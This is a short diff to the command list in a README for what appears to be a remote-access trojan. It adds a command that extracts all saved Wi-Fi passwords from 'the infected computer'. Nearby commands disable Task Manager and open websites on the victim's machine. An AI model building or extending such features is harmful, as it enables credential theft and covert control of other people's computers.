@@ -90,6 +90,7 @@ Availaible commands are :
 --> !website = open a website on the infected computer / syntax = "!website google.com" or "!website www.google.com"
 --> !distaskmgr = disable task manager(Admin rights are required)
 --> !enbtaskmgr = enable task manager(if disabled)(Admin rights are required)
+--> !getwifipass = get all the wifi passwords on the current device(Admin rights are required)
 ```
 ## **Advice:**
 If you have problems with the installation of win32api or other modules , try installing it in a python virtual environment.\
